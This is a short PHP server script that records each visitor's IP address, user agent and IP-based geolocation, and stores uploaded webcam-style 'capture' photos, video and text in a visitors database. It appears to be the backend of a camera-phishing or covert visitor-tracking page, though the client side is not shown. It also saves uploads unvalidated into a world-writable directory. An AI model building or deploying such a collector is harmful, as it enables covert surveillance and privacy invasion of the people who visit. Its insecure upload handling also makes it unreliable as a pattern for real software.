<?php
require_once '../includes/db.php'; // adjust path

$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$location = @file_get_contents("http://ip-api.com/json/{$ip}");
$location = $location ? json_decode($location, true) : [];
$city = $location['city'] ?? '';
$region = $location['regionName'] ?? '';
$country = $location['country'] ?? '';

$upload_dir = __DIR__ . '/../uploads/';
if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);

// Save image
$image_path = '';
if(isset($_FILES['image']) && $_FILES['image']['error'] === 0){
    $img_name = time() . "_capture.png";
    move_uploaded_file($_FILES['image']['tmp_name'], $upload_dir.$img_name);
    $image_path = "uploads/".$img_name;
}

// Save video
$video_path = '';
if(isset($_FILES['video']) && $_FILES['video']['error'] === 0){
    $vid_name = time() . "_capture.webm";
    move_uploaded_file($_FILES['video']['tmp_name'], $upload_dir.$vid_name);
    $video_path = "uploads/".$vid_name;
}

// Save to DB
$stmt = $pdo->prepare("INSERT INTO visitors (ip_address, city, region, country, user_agent, text_input, photo_path, video_path) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
$stmt->execute([$ip, $city, $region, $country, $user_agent, $_POST['text'] ?? '', $image_path, $video_path]);

echo "Captured successfully!";
